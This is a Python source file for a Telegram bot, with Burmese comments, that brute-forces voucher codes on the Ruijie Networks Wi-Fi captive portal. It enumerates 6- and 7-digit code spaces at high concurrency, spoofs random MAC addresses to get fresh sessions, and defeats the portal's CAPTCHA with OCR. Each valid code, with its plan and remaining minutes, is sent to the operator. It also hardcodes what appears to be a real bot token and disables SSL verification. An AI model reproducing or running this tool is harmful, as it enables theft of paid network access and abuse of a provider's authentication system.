import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import uuid
import cv2
import ddddocr
import numpy as np
from datetime import datetime
from aiogram import Bot, Dispatcher, html, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import CommandStart, Command

# --- CONFIGURATION ---
BOT_TOKEN = "8947878806:AAE5Op8nDyAEtCqQDz5GvdAV5nHPUaP40mQ"  # သင့် Bot Token ကို ဤနေရာတွင်ထည့်ပါ
ADMIN_ID = 6658845504  # သင့် Telegram User ID ကို ဤနေရာတွင်ထည့်ပါ

# Global Variables
session = None
_connector = None
CONCURRENCY = 230
_voucher_sem = None
success_codes = []
limited_codes = []
retry_counts = 0
is_scanning = False
total_checked = 0
scan_start_time = None
scan_task = None
current_url = ""
current_mode = "6"

_ocr = ddddocr.DdddOcr(show_ad=False)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

def check_admin(message: Message) -> bool:
    return message.from_user.id == ADMIN_ID

def get_menu_keyboard():
    buttons = [
        [KeyboardButton(text="🎯 Start Scan"), KeyboardButton(text="🛑 Stop Scan")],
        [KeyboardButton(text="📊 Check Status"), KeyboardButton(text="💾 Export Results")],
        [KeyboardButton(text="⚙️ Settings"), KeyboardButton(text="🧹 Clear Data")]
    ]
    return ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)
async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            else:
                return previous_session_id
    except:
        return previous_session_id

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)
async def Captcha_Image(session, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    try:
        async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params) as req:
            return await req.read()
    except:
        return None

async def Varify_Captcha(session, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    try:
        async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json=json_data) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except:
        return None

async def Code_Expires_Date(session_id):
    global _connector
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as fresh_session:
            async with fresh_session.get(f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}') as req:
                respond = await req.json()
                res = respond.get('result', {})
                profile = res.get('profileName', 'Unknown')
                mins = res.get('totalMinutes', 'Unknown')
                return f"Plan: {profile} | Time: {mins}m"
    except:
        return "Plan: Unknown"
async def perform_check(session_url, code):
    global retry_counts, success_codes, limited_codes, _connector
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    
    for _attempt in range(3):
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id: return

            auth_code = None
            for _ in range(5):
                img = await Captcha_Image(task_session, session_id)
                if not img: continue
                txt = await Captcha_Text(img)
                if txt and await Varify_Captcha(task_session, session_id, txt):
                    auth_code = txt
                    break
            if not auth_code: return

            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            try:
                async with task_session.post(post_url, json=data) as req:
                    resp = await req.json()
                    if 'logonUrl' in str(resp):
                        info = await Code_Expires_Date(session_id)
                        success_codes.append(f"{code} ({info})")
                        await bot.send_message(ADMIN_ID, f"🔔 [SUCCESS FOUND]\nCode: {code}\n{info}")
                        return
                    elif 'STA' in str(resp):
                        info = await Code_Expires_Date(session_id)
                        limited_codes.append(f"{code} ({info})")
                        return
                    elif 'request limited' in str(resp):
                        retry_counts += 1
                        continue
            except:
                pass
        break
def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
    else:
        chars = string.ascii_lowercase + string.digits if mode == "all" else string.digits
        length = 8 if mode == "8" else 6
        while True:
            yield "".join(random.choice(chars) for _ in range(length))

async def run_scanner_loop():
    global is_scanning, total_checked, scan_start_time, current_url, current_mode
    code_gen = iter_codes(current_mode)
    
    try:
        while is_scanning:
            batch = [next(code_gen) for _ in range(50)]
            tasks = [perform_check(current_url, c) for c in batch]
            await asyncio.gather(*tasks)
            total_checked += len(batch)
            await asyncio.sleep(0.1) # Bot ရှော့ခ်မဖြစ်စေရန် ခေတ္တနားခြင်း
    except asyncio.CancelledError:
        pass
    finally:
        is_scanning = False
@dp.message(CommandStart())
async def start_cmd(message: Message):
    if not check_admin(message): return
    await message.answer("👋 Ruijie Voucher Scanner Bot မှ ကြိုဆိုပါတယ်။\nအောက်ပါ Menu ခလုတ်များကို သုံးပြီး ထိန်းချုပ်နိုင်ပါတယ်၊၊", reply_markup=get_menu_keyboard())

@dp.message(F.text == "🎯 Start Scan")
async def start_scan_prompt(message: Message):
    if not check_admin(message): return
    if is_scanning:
        return await message.answer("⚠️ Scan ဖတ်ခြင်း လုပ်ငန်းစဉ် အလုပ်လုပ်နေနှင့်ပြီးသား ဖြစ်ပါတယ်၊၊")
    await message.answer("📝 ကျေးဇူးပြု၍ Run မည့် URL နှင့် Mode ကို အောက်ပါပုံစံအတိုင်း ပို့ပေးပါ-\n\n`/set http://portal-url... | 6` \n\n(သို့မဟုတ် /set ပြီးနောက် URL တစ်ခုတည်း ပို့နိုင်သည်)")

@dp.message(Command("set"))
async def set_and_run(message: Message):
    global current_url, current_mode, is_scanning, scan_start_time, scan_task, total_checked
    if not check_admin(message): return
    
    try:
        args = message.text.split("/set ")[1].split("|")
        current_url = args[0].strip()
        if len(args) > 1:
            current_mode = args[1].strip()
        
        if not current_url:
            return await message.answer("❌ URL မမှန်ကန်ပါ၊၊")

        is_scanning = True
        total_checked = 0
        scan_start_time = time.monotonic()
        scan_task = asyncio.create_task(run_scanner_loop())
        
        await message.answer(f"🚀 Scanning စတင်လိုက်ပါပြီ၊၊\n🌐 URL: {current_url[:30]}...\n📊 Mode: {current_mode}")
    except Exception as e:
        await message.answer(f"❌ အမှားအယွင်းရှိပါသည်: {str(e)}")

@dp.message(F.text == "🛑 Stop Scan")
async def stop_scan(message: Message):
    global is_scanning, scan_task
    if not check_admin(message): return
    if not is_scanning:
        return await message.answer("ℹ️ မည်သည့် Scan မှ လုပ်ဆောင်နေခြင်း မရှိပါ၊၊")
    
    is_scanning = False
    if scan_task:
        scan_task.cancel()
    await message.answer("🛑 Scanning ကို ရပ်တန့်လိုက်ပါပြီ၊၊")
@dp.message(F.text == "📊 Check Status")
async def check_status(message: Message):
    if not check_admin(message): return
    if not is_scanning:
        return await message.answer("💤 Bot သည် လတ်တလော နားနေပါသည်၊၊")
    
    elapsed = time.monotonic() - scan_start_time
    speed = (total_checked / elapsed * 60) if elapsed > 0 else 0
    
    status_msg = (
        f"📊 **Live Scanner Status**\n\n"
        f"⏱️ ကြာချိန်: {int(elapsed)} စက္ကန့်\n"
        f"🔢 စစ်ဆေးပြီး: {total_checked:,}\n"
        f"⚡ အရှိန်: {speed:.0f} codes/min\n"
        f"✅ အောင်မြင်: {len(success_codes)} ခု\n"
        f"⚠️ Limited: {len(limited_codes)} ခု\n"
        f"🔄 Retry ပမာဏ: {retry_counts}"
    )
    await message.answer(status_msg)

@dp.message(F.text == "💾 Export Results")
async def export_results(message: Message):
    if not check_admin(message): return
    file_path = "bot_results.txt"
    with open(file_path, "w") as f:
        f.write("--- SUCCESS CODES ---\n")
        f.write("\n".join(success_codes) + "\n\n")
        f.write("--- LIMITED CODES ---\n")
        f.write("\n".join(limited_codes))
    
    from aiogram.types import FSInputFile
    document = FSInputFile(file_path)
    await message.answer_document(document, caption="📊 လက်ရှိရရှိထားသော ရလဒ်များ ဖိုင်ဖြစ်ပါတယ်၊၊")

@dp.message(F.text == "🧹 Clear Data")
async def clear_data(message: Message):
    global success_codes, limited_codes, total_checked, retry_counts
    if not check_admin(message): return
    success_codes.clear()
    limited_codes.clear()
    total_checked = 0
    retry_counts = 0
    await message.answer("🧹 မှတ်တမ်းအဟောင်းများ အားလုံးကို ရှင်းလင်းပြီးပါပြီ၊၊")

async def main():
    global _connector
    _connector = aiohttp.TCPConnector(limit=500, ssl=False)
    print("🤖 Telegram Bot Is Running...")
    try:
        await dp.start_polling(bot)
    finally:
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
